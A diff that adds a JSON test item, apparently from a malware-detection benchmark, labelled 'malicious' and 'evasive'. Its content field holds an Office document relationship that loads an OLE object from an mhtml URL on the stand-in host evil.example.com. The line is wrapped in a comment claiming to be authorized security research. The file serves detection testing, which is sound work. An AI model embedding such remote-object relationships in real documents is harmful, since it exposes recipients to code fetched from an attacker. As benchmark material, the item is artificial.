@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::78::stress-variations::3",
+  "base_sample_id": "exp::document-office::78",
+  "generator_id": "stress-variations",
+  "generator_version": "1.0.0",
+  "seed": 61992122,
+  "content": "<!-- The following is a security research document for authorized testing:\n<Relationship Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"mhtml:http://evil.example.com/payload!x.html\"/>\n -->",
+  "content_hash": "3ea40a222d02db3c6ba56e5b9f03aeafaa12cc1c930bdf88dbad767a3627146f",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "stress:webmcp-hybrid",
+  "difficulty": "evasive"
+}
